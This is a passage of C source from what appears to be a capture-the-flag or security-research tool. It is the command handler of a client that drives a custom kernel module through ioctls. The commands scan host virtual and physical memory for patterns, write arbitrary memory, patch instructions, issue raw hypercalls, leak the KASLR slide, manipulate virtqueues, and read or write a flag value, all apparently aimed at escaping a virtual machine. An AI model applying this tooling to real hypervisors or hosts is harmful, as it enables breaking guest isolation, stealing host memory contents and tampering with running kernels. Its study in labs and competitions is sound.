        unsigned long step = strtoul(argv[4], NULL, 10);
        if (step == 0 || step > 99999999) {
            fprintf(stderr, "Invalid step size (1-99999999 bytes)\n");
            close(fd);
            return 1;
        }
        unsigned char *buf = malloc(step);
        if (!buf) {
            perror("malloc for scanmmio buffer");
            close(fd);
            return 1;
        }
        for (unsigned long addr = start; addr < end; addr += step) {
            struct mmio_data data = {0};
            data.phys_addr = addr;
            data.size = step;
            data.user_buffer = buf;
            if (ioctl(fd, IOCTL_READ_MMIO, &data) < 0) {
                printf("0x%lX: ERROR\n", addr);
            } else {
                if (g_global_gold) {
                    check_gold_patterns(buf, step, addr);
                } else {
                    printf("0x%lX:", addr);
                    for (unsigned long i = 0; i < step; ++i) {
                        printf("%02X", buf[i]);
                    }
                    printf("\n");
                }
             }
         }
         free(buf);

    } else if (strcmp(cmd, "scanhostmem") == 0) {
        if (argc < 5) { print_usage(argv[0]); close(fd); return 1; }
        unsigned long start = strtoul(argv[2], NULL, 16);
        unsigned long end = strtoul(argv[3], NULL, 16);
        unsigned long step = strtoul(argv[4], NULL, 10);
        
        if (step == 0 || step > 99999999) {
            fprintf(stderr, "Invalid step size (1-99999999 bytes)\n");
            close(fd);
            return 1;
        }
        
        unsigned char *buf = malloc(step);
        if (!buf) {
            perror("malloc for scanhostmem buffer");
            close(fd);
            return 1;
        }
        
        int gold_found_any = 0;
        
        for (unsigned long addr = start; addr < end; addr += step) {
            struct host_mem_access req = {0};
            req.host_addr = addr;
            req.length = step;
            req.user_buffer = buf;
            
            if (ioctl(fd, IOCTL_READ_HOST_MEM, &req) < 0) {
                if (!g_global_gold) {
                    printf("0x%lX: ERROR\n", addr);
                }
            } else {
                if (g_global_gold) {
                    int gold_found = check_gold_patterns(buf, step, addr);
                    if (gold_found) gold_found_any = 1;
                } else {
                    printf("0x%lX:\nHex: ", addr);
                    for (unsigned long i = 0; i < step; ++i) {
                        printf("%02X", buf[i]);
                        if ((i + 1) % 16 == 0 && i + 1 < step) printf(" ");
                    }
                    printf("\nASCII: ");
                    for (unsigned long i = 0; i < step; ++i) {
                        unsigned char c = buf[i];
                        printf("%c", (c >= 32 && c <= 126) ? c : '.');
                        if ((i + 1) % 16 == 0 && i + 1 < step) printf(" ");
                    }
                    printf("\n\n");
                }
            }
        }
        
        free(buf);

    } else if (strcmp(cmd, "scanhostphys") == 0) {
        if (argc < 5) { print_usage(argv[0]); close(fd); return 1; }
        unsigned long start = strtoul(argv[2], NULL, 16);
        unsigned long end = strtoul(argv[3], NULL, 16);
        unsigned long step = strtoul(argv[4], NULL, 10);
        
        if (step == 0 || step > 99999999) {
            fprintf(stderr, "Invalid step size (1-99999999 bytes)\n");
            close(fd);
            return 1;
        }
        
        unsigned char *buf = malloc(step);
        if (!buf) {
            perror("malloc for scanhostphys buffer");
            close(fd);
            return 1;
        }
        
        int gold_found_any = 0;
        
        for (unsigned long addr = start; addr < end; addr += step) {
            struct host_phys_access req = {0};
            req.host_phys_addr = addr;
            req.length = step;
            req.user_buffer = buf;
            
            if (ioctl(fd, IOCTL_READ_HOST_PHYS, &req) < 0) {
                if (!g_global_gold) {
                    printf("0x%lX: ERROR\n", addr);
                }
            } else {
                if (g_global_gold) {
                    int gold_found = check_gold_patterns(buf, step, addr);
                    if (gold_found) gold_found_any = 1;
                } else {
                    printf("0x%lX:\nHex: ", addr);
                    for (unsigned long i = 0; i < step; ++i) {
                        printf("%02X", buf[i]);
                        if ((i + 1) % 16 == 0 && i + 1 < step) printf(" ");
                    }
                    printf("\nASCII: ");
                    for (unsigned long i = 0; i < step; ++i) {
                        unsigned char c = buf[i];
                        printf("%c", (c >= 32 && c <= 126) ? c : '.');
                        if ((i + 1) % 16 == 0 && i + 1 < step) printf(" ");
                    }
                    printf("\n\n");
                }
            }
        }
        
        free(buf);

    } else if (strcmp(cmd, "writeva") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct va_write_data req = {0};
        req.va = strtoul(argv[2], NULL, 16);
        unsigned long nbytes = 0;
        req.user_buffer = hex_string_to_bytes(argv[3], &nbytes);
        req.size = nbytes;
        if (!req.user_buffer || req.size == 0) {
            fprintf(stderr, "Failed to parse hex string for writeva\n");
            if (req.user_buffer) free(req.user_buffer);
            close(fd);
            return 1;
        }
        if (ioctl(fd, IOCTL_WRITE_VA, &req) < 0) {
            perror("ioctl IOCTL_WRITE_VA failed");
        } else {
            printf("Wrote %lu bytes to VA 0x%lx\n", nbytes, req.va);
        }
        free(req.user_buffer);

    } else if (strcmp(cmd, "patchinstr") == 0) {
        if (argc != 4) { print_usage(argv[0]); close(fd); return 1; }
        struct va_scan_data req = {0};
        req.va = strtoul(argv[2], NULL, 16);
        unsigned long nbytes = 0;
        req.user_buffer = hex_string_to_bytes(argv[3], &nbytes);
        req.size = nbytes;
        if (!req.user_buffer || req.size == 0) {
            fprintf(stderr, "Failed to parse hex string for patchinstr\n");
            if (req.user_buffer) free(req.user_buffer);
            close(fd);
            return 1;
        }
        if (ioctl(fd, IOCTL_PATCH_INSTRUCTIONS, &req) < 0) {
            perror("ioctl IOCTL_PATCH_INSTRUCTIONS failed");
        } else {
            printf("Patched %lu bytes at VA 0x%lx\n", nbytes, req.va);
        }
        free(req.user_buffer);

    } else if (strcmp(cmd, "hypercall") == 0) {
        if (argc < 3) {
            print_usage(argv[0]);
            close(fd);
            return 1;
        }
        struct hypercall_args args = {0};
        args.nr = strtoul(argv[2], NULL, 0);
        if (argc > 3) args.arg0 = strtoul(argv[3], NULL, 0);
        if (argc > 4) args.arg1 = strtoul(argv[4], NULL, 0);
        if (argc > 5) args.arg2 = strtoul(argv[5], NULL, 0);
        if (argc > 6) args.arg3 = strtoul(argv[6], NULL, 0);

        if (ioctl(fd, IOCTL_HYPERCALL_ARGS, &args) < 0) {
            perror("ioctl HYPERCALL_ARGS failed");
        } else {
            printf("Hypercall returned: %ld\n", (long)args.arg0);
        }

    } else if (strcmp(cmd, "readflag") == 0) {
        if (argc != 2) { print_usage(argv[0]); close(fd); return 1; }
        unsigned long value;
        if (ioctl(fd, IOCTL_READ_FLAG_ADDR, &value) < 0) {
            perror("ioctl READ_FLAG_ADDR failed");
        } else {
            printf("Flag value: 0x%lx\n", value);
        }

    } else if (strcmp(cmd, "readflag_full") == 0) {
        if (argc != 2) { print_usage(argv[0]); close(fd); return 1; }
        unsigned char buf[32];
        memset(buf, 0, sizeof(buf));
        if (ioctl(fd, IOCTL_READ_FLAG_FULL, buf) < 0) {
            perror("ioctl READ_FLAG_FULL failed");
        } else {
            printf("Full flag (64 hex digits): 0x");
            print_full_32byte_hex(buf);
            printf("\n");
        }

    } else if (strcmp(cmd, "writeflag") == 0) {
        if (argc != 3) { print_usage(argv[0]); close(fd); return 1; }
        unsigned long value = strtoul(argv[2], NULL, 16);
        if (ioctl(fd, IOCTL_WRITE_FLAG_ADDR, &value) < 0) {
            perror("ioctl WRITE_FLAG_ADDR failed");
        } else {
            printf("Wrote 0x%lx to flag address\n", value);
        }

    } else if (strcmp(cmd, "getkaslr") == 0) {
        if (argc != 2) { print_usage(argv[0]); close(fd); return 1; }
        unsigned long slide;
        if (ioctl(fd, IOCTL_GET_KASLR_SLIDE, &slide) < 0) {
            perror("ioctl GET_KASLR_SLIDE failed");
        } else {
            printf("KASLR slide: 0x%lx\n", slide);
        }

    } else if (strcmp(cmd, "virt2phys") == 0) {
        if (argc != 3) { print_usage(argv[0]); close(fd); return 1; }
        unsigned long virt = strtoul(argv[2], NULL, 16);
        if (ioctl(fd, IOCTL_VIRT_TO_PHYS, &virt) < 0) {
            perror("ioctl VIRT_TO_PHYS failed");
        } else {
            printf("Virtual 0x%lx -> Physical 0x%lx\n",
                   strtoul(argv[2], NULL, 16), virt);
        }

    } else if (strcmp(cmd, "attachvq") == 0) {
        if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
        struct attach_vq_data data = {
            .device_id = (unsigned int)strtoul(argv[2], NULL, 10),
            .vq_pfn = strtoul(argv[3], NULL, 16),
            .queue_index = (unsigned int)strtoul(argv[4], NULL, 10)
        };
        if (ioctl(fd, IOCTL_ATTACH_VQ, &data) < 0)
            perror("ioctl ATTACH_VQ failed");
        else
            printf("Virtqueue attached to device %u\n", data.device_id);

    } else if (strcmp(cmd, "trigvq") == 0) {
        if (argc != 3) { print_usage(argv[0]); close(fd); return 1; }
        unsigned int device_id = (unsigned int)strtoul(argv[2], NULL, 10);
        if (ioctl(fd, IOCTL_TRIGGER_VQ, &device_id) < 0)
            perror("ioctl TRIGGER_VQ failed");
        else
            printf("Triggered device %u processing\n", device_id);

    } else if (strcmp(cmd, "scanphys") == 0) {
        if (argc != 5) { print_usage(argv[0]); close(fd); return 1; }
        unsigned long start = strtoul(argv[2], NULL, 16);
        unsigned long end = strtoul(argv[3], NULL, 16);
        unsigned long step = strtoul(argv[4], NULL, 10);
        if (step == 0 || step > 99999999) {
            fprintf(stderr, "Invalid step size (1-99999999 bytes)\n");
            close(fd);
            return 1;
        }
        unsigned char *buf = malloc(step);
        if (!buf) {
            perror("malloc for scanphys buffer");
            close(fd);
            return 1;
        }
        for (unsigned long addr = start; addr < end; addr += step) {
            struct mmio_data data = {0};
            data.phys_addr = addr;
            data.size = step;
            data.user_buffer = buf;
            if (ioctl(fd, IOCTL_SCAN_PHYS, &data) < 0) {
                printf("0x%lX: ERROR\n", addr);
            } else {
                printf("0x%lX:", addr);
                for (unsigned long i = 0; i < step; ++i) {
                    printf("%02X", buf[i]);
                }
                printf("\n");
            }
        }
        free(buf);

    } else {
        fprintf(stderr, "Unknown command: %s\n", cmd);
        print_usage(argv[0]);
    }
    close(fd);
    return 0;
}